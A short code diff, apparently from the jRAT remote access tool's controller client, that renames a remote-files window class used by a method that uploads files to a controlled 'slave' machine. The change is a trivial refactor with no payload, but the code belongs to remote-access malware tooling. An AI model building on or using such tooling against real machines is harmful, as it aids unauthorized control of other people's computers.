@@ -4,7 +4,7 @@ import java.io.File;
 
 import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
 import se.jrat.client.ui.frames.FrameFileTransfer;
-import se.jrat.client.ui.frames.FrameRemoteFiles;
+import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 
 
 public class SendFile {
@@ -15,7 +15,7 @@ public class SendFile {
 
 	public static void sendFile(final Slave slave, final File file, String destdir) {
 		final FrameFileTransfer frame = FrameFileTransfer.instance;
-		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
+		final FrameRemoteFilesOld frame2 = FrameRemoteFilesOld.instances.get(slave);
 
 		if (frame2 != null) {
 			frame2.start();
